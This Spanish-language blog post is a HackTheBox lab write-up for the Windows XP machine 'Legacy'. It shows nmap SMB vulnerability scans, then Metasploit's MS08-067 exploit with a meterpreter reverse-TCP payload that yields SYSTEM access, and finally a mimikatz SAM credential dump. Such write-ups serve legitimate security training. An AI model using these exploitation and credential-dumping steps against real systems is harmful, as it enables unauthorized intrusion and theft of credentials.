---
layout: post
title : "Legacy - HackTheBox"
author : elc4br4
image : /assets/images/HTB/Legacy-HackTheBox/Legacy.jpg
optimized_image : /assets/images/HTB/Legacy-HackTheBox/Legacy.jpg
tags : [ Windows, HackTheBox ]
description : 👽Esta vez resolveré una máquina Windows nivel Easy de la plataforma HackTheBox, en la que aprovecharemos una vulnerabilidad del protocolo samba para ganar acceso a la máquina con privilegios máximos👽.
---

Esta vez resolveré una máquina Windows nivel Easy de la plataforma HackTheBox, en la que aprovecharemos una vulnerabilidad del protocolo samba para ganar acceso a la máquina con privilegios máximos.

Como siempre comenzaremos lanzando un escaneo nmap para descubrir puertos abiertos en la máquina.

```ruby
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m17s, median: 4d22h57m37s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ee:27 (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-06-30T02:01:21+03:00
```

Y como vemos tenemos el puerto 445 (smb) abierto.

* Y podemos ver que estamos ante un Windows XP.

Al ver esto lanzaré una serie de scripts de nmap para comprobar si es vulnerable.

Para revisar los script de nmap solo debemos ir a esta ruta `/usr/share/nmap/scripts`

Ahí encontraremos todos los scripts que nos ofrece nmap.

En mi caso realizaré un filtrado para buscar solo los del servicio smb.

```ruby
locate .nse | grep smb-vuln
```

![](/assets/images/HTB/Legacy-HackTheBox/smb-vuln.webp)

Ahí tenemos los scripts que vamos a usar para el escaneo, por lo que ya solo queda lanzar el escaneo.

```ruby
nmap --script "smb-vuln*" -p445 10.10.10.4
------------------------------------------
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false

```

Si nos fijamos bien podemos ver la siguiente información.

```bash
smb-vuln-ms08-067: 
 VULNERABLE
smb-vuln-ms17-010:
 VULNERABLE
```

Nos indica que es vulnerable a ms08-067 y a ms17-010 (eternalblue).

Pero en este caso tras haber probado, podemos dar por hecho que es un falso positivo y que no es vulnerable a eternalblue.

Por lo que solo nos quedaría probar si es vulnerable a ms08-067.

Esto lo haré a través de metasploit.

Abro metasploit y busco el exploit correspondiente.

![](/assets/images/HTB/Legacy-HackTheBox/msf1.webp)

Tras encontrarlo lo selecciono y lo configuro con los parámetros necesarios.

```ruby
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.87.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4

msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => tun0
```

Una vez configurado lo lanzamos con el comando `exploit` y ganaremos acceso a la máquina.

```ruby
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.10.10.4:1032) at 2023-06-24 23:11:05 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 1628 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
```

Como podemos ver hemos ganado acceso y somos el usuario Administrador, por lo que tenemos privilegios y podemos leer las flag de user y root.

Máquina pwneada.

De forma adicional podemos dumpear la SAM haciendo uso de mimikatz a través de meterpreter.

Dentro de la sesión meterpreter ejecutamos el comando `load kiwi` y se nos ejecutará el mimikatz.

![](/assets/images/HTB/Legacy-HackTheBox/kiwi.webp)

Y una vez cargado ejecutamos `lsa_dump_sam` y nos dumpeará la SAM.

![](/assets/images/HTB/Legacy-HackTheBox/SAM.webp)
